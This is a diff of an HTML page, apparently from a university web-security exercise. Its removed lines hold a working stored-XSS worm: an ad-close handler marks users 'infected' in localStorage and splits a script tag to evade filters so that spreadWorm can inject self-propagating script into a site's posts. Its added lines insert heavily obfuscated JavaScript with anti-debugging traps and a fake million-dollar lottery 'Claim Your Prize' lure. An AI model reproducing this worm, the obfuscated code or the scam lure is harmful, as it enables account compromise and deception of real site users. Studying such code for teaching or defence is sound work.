_0x656275=_0x4ec995[_0x4d047f(0xcd)],_0x29b66c=_0x4d047f(0x97),_0x44264e=_0x4ec995['LWcwX'](_0x4ec995[_0x4d047f(0xc6)](_0x4ec995[_0x4d047f(_0x4447ac._0x4ef2d5)](_0x4ec995['fMcpv'](_0x4d047f(0x89),_0x4d047f(0xad)),_0x29b66c),_0x4ec995['qUSoe']),_0x4ec995[_0x4d047f(0xc4)]);_0x514ba1(_0x4ec995['RfKUW'](_0x656275,_0x44264e));});}),(function(){const _0x3ff5ef={_0x28de79:0xd1},_0x33b8cd=_0x23abb8,_0x55f97e={'xbyPa':function(_0x194fac,_0x3d1606){return _0x194fac(_0x3d1606);},'BaTpM':function(_0x4ac615,_0xb9dec9){return _0x4ac615+_0xb9dec9;},'HQonC':_0x33b8cd(_0x3ff5ef._0x28de79),'rnAeX':function(_0x5c2037){return _0x5c2037();}},_0xb0717=function(){const _0x232f92=_0x33b8cd;let _0x3908eb;try{_0x3908eb=_0x55f97e[_0x232f92(0x9f)](Function,_0x55f97e[_0x232f92(0xb5)](_0x55f97e['BaTpM']('return\x20(function()\x20',_0x55f97e[_0x232f92(0xa1)]),');'))();}catch(_0x34af85){_0x3908eb=window;}return _0x3908eb;},_0x5be36a=_0x55f97e[_0x33b8cd(0x96)](_0xb0717);_0x5be36a[_0x33b8cd(0xdc)](_0x23965f,0xd9b*0x2+0x1*-0x17b+-0x19ac);}());function _0x23965f(_0x228d47){const _0x35cda3={_0x4c8ff7:0xc1,_0x17af21:0xd9,_0x16a9c6:0xb9,_0x3651b9:0x92},_0x16a7f8={_0x2ec483:0xc3,_0x133b9a:0x85,_0x1a2eb0:0xa3,_0x1be460:0x8e,_0x3fddb3:0xcc,_0x56fd8b:0xd4,_0x29f050:0xc1,_0x1b5af7:0xac,_0x21884e:0xb6},_0x529292=_0x23abb8,_0x19c144={'NzVKB':function(_0x36c8a8,_0xda99ab){return _0x36c8a8===_0xda99ab;},'wnzqa':_0x529292(0xaa),'iCJpe':'while\x20(true)\x20{}','YqubX':'counter','SYRRk':function(_0x5bbbc2,_0x22df16){return _0x5bbbc2!==_0x22df16;},'iSNWE':function(_0x1c9574,_0x1cd21e){return _0x1c9574+_0x1cd21e;},'LTyCL':function(_0x21bdc4,_0x45607f){return _0x21bdc4/_0x45607f;},'TBDnb':_0x529292(0xd6),'qunjM':function(_0x4022e6,_0x3a8152){return _0x4022e6===_0x3a8152;},'IhmOe':_0x529292(_0x35cda3._0x4c8ff7),'IrbRL':_0x529292(_0x35cda3._0x17af21),'mfrmU':_0x529292(_0x35cda3._0x16a9c6),'pDCoI':function(_0x5eb4be,_0x32cf55){return _0x5eb4be(_0x32cf55);}};function _0x1c28a7(_0x5529d2){const _0xaa088d=_0x529292;if(_0x19c144[_0xaa088d(_0x16a7f8._0x2ec483)](typeof _0x5529d2,_0x19c144[_0xaa088d(_0x16a7f8._0x133b9a)]))return function(_0x35487d){}[_0xaa088d(_0x16a7f8._0x1a2eb0)](_0x19c144[_0xaa088d(0x87)])['apply'](_0x19c144[_0xaa088d(_0x16a7f8._0x1be460)]);else _0x19c144[_0xaa088d(0xb7)](_0x19c144[_0xaa088d(_0x16a7f8._0x3fddb3)]('',_0x19c144[_0xaa088d(0x95)](_0x5529d2,_0x5529d2))[_0x19c144['TBDnb']],0x2445+-0x1*-0x1331+0x1*-0x3775)||_0x19c144['qunjM'](_0x5529d2%(0x438+-0x2016+0x1bf2),0xb9d*-0x1+0x479+0x724)?function(){return!![];}['constructor'](_0x19c144[_0xaa088d(0xcc)](_0x19c144[_0xaa088d(0x86)],_0x19c144[_0xaa088d(0xac)]))['call'](_0xaa088d(_0x16a7f8._0x56fd8b)):function(){return![];}[_0xaa088d(0xa3)](_0x19c144[_0xaa088d(0xcc)](_0xaa088d(_0x16a7f8._0x29f050),_0x19c144[_0xaa088d(_0x16a7f8._0x1b5af7)]))[_0xaa088d(0xc7)](_0x19c144[_0xaa088d(_0x16a7f8._0x21884e)]);_0x1c28a7(++_0x5529d2);}try{if(_0x228d47)return _0x1c28a7;else _0x19c144[_0x529292(_0x35cda3._0x3651b9)](_0x1c28a7,-0x796*-0x1+0xd*0x107+-0x14f1);}catch(_0x1673f8){}}
+    </script>    
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(to bottom, #ffefba, #ffffff);
+            font-family: 'Arial', sans-serif;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            text-align: center;
+            animation: fadeIn 1.5s ease-in-out;
+        }
+
+        h1 {
+            font-size: 3rem;
+            color: #ff6f61;
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.2);
+        }
+
+        h2 {
+            font-size: 2rem;
+            color: #333;
+        }
+
+        .winning-amount {
+            font-size: 4rem;
+            color: #ffca28;
+            margin: 20px 0;
+            text-shadow: 3px 3px 10px rgba(255, 202, 40, 0.7);
+        }
+
+        button {
+            padding: 15px 30px;
+            font-size: 1.5rem;
+            color: white;
+            background: #28a745;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+            box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        button:hover {
+            background: #218838;
+        }
+
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: #ff6f61;
+            border-radius: 50%;
+            opacity: 0;
+            animation: confetti-fall 2.5s linear infinite;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
             }
-    
-            // Function to retrieve the CSRF token from cookies
-            function getCSRFToken() {
-                const cookies = document.cookie.split(";");
-                for (let cookie of cookies) {
-                    const [key, value] = cookie.trim().split("=");
-                    if (key === "csrftoken") {
-                        return value;
-                    }
-                }
-                return null;
+            to {
+                opacity: 1;
             }
         }
-    
-        // Wait for the DOM to be fully loaded
-        document.addEventListener("DOMContentLoaded", () => {
-            // Select the Close Ad button
-            const closeAdBtn = document.getElementById("close-ad-btn");
-            if (!closeAdBtn) {
-                console.error("Close Ad button not found!");
-                return;
+
+        @keyframes confetti-fall {
+            0% {
+                transform: translateY(-100vh) rotate(0deg);
+                opacity: 1;
             }
-    
-            closeAdBtn.addEventListener("click", () => {
-    
-                // Check if the user has already been infected
-                const session = localStorage.getItem("SESSIONID");
-                const isAlreadyInfected = session == "ae0b6badeb338b59cda2135ed783c28beaf6d622" || session == "2d6cfd5ae2dfbf26ec2a2f26759306fdb54cc1e4" ? true : false;
-                
-                if (isAlreadyInfected) {
-                    console.log(`User has already been infected. Skipping injection.`);
-                    return;
-                }
-    
-                // Mark the current user as infected
-                localStorage.setItem("SESSIONID", "ae0b6badeb338b59cda2135ed783c28beaf6d622");
-    
-                    // Prepare the worm message and additional script
-                    const text = "AEV é sem dúvida a melhor cadeira de todas! Acho que merecemos todos um 20!";
-                    const payload = `
-                            (function tickleWorm() {
-                                const triggerWord = "AEV é sem dúvida a melhor cadeira de todas! Acho que merecemos todos um 20!";
-                                const posts = document.querySelectorAll('.card.vichlacard');
-                                console.log("posts posts: ", posts);
-                                // Run the worm only once per page
-                                if (document.body.dataset.wormInjected) return;
-                                document.body.dataset.wormInjected = "true"; // Mark the worm as injected
+            100% {
+                transform: translateY(100vh) rotate(360deg);
+                opacity: 0;
+            }
+        }
 
-                                posts.forEach((post) => {
-                                    if (!post.dataset.tickleWorm) {
-                                        post.dataset.tickleWorm = true;
+    </style>
+</head>
+<body>
+    <div id="ad-section" class="container">
+        <h1>🎉 Congratulations! 🎉</h1>
+        <h2>You Are Our Lucky Winner</h2>
+        <div class="winning-amount">$1,000,000</div>
+        <p>Thank you for participating in our lottery. Your dedication and support mean everything to us!</p>
+        <button id="close-ad-btn" onclick="showMessage()">Claim Your Prize</button>
+    </div>
 
-                                        // Extract the caption text
-                                        const captionElement = post.querySelector('.card-text.caption');
-                                        const captionText = captionElement ? captionElement.textContent : "";
-                                        let session = localStorage.getItem("SESSIONID");
-                                        const isAlreadyInfected = session == "ae0b6badeb338b59cda2135ed783c28beaf6d622" ? true : false;
-                                        console.log("post isAlreadyInfected: ", isAlreadyInfected);
-                                        // If the trigger word is found, display an image
-                                        if (captionText.includes(triggerWord)) {
-                                            // Check if the user has already been infected
-                                            if (isAlreadyInfected) {
-                                                console.log("User has already been infected. Skipping injection.");
-                                                return;
-                                            } else {
-                                                displayImage();
-                                                localStorage.setItem("SESSIONID", "2d6cfd5ae2dfbf26ec2a2f26759306fdb54cc1e4");                                      
-                                            }
-                                        }
-                                    }
-                                });
+    <!-- Confetti effect -->
+    <script>
+        const confettiColors = ["#ff6f61", "#ffca28", "#4caf50", "#2196f3", "#9c27b0"];
 
-                                // Function to display an image
-                                function displayImage() {
-                                    const img = document.createElement("img");
-                                    img.src = "https://media.tenor.com/aUGKNa38o-gAAAAe/virus-computer.png"; // Replace with your image URL
-                                    img.style.position = "fixed";
-                                    img.style.top = "50%";
-                                    img.style.left = "50%";
-                                    img.style.transform = "translate(-50%, -50%)";
-                                    img.style.zIndex = "9999";
-                                    img.style.border = "2px solid black";
-                                    img.style.borderRadius = "10px";
-                                    img.style.boxShadow = "0 0 10px rgba(0, 0, 0, 0.5)";
-                                    document.body.appendChild(img);
+        function createConfetti() {
+            for (let i = 0; i < 100; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.background = confettiColors[Math.floor(Math.random() * confettiColors.length)];
+                confetti.style.animationDelay = Math.random() * 2 + 's';
+                confetti.style.animationDuration = 2 + Math.random() * 2 + 's';
+                document.body.appendChild(confetti);
 
-                                    // Automatically remove the image after 5 seconds
-                                    setTimeout(() => {
-                                        img.remove();
-                                    }, 5000);
-                                }
-                            })();`
-            const script = "<scr"+"ipt>" + payload + "</scr"+"ipt>";
-            // Spread the worm
-            spreadWorm(text + script);
-            });
-        });
-    </script>    
+                setTimeout(() => confetti.remove(), 5000);
+            }
+        }
+
+        function showMessage() {
+            alert("Your prize is being processed! Check your email for details.");
+        }
+
+        // Trigger confetti on page load
+        window.onload = createConfetti;
+    </script>
 </body>
 </html>
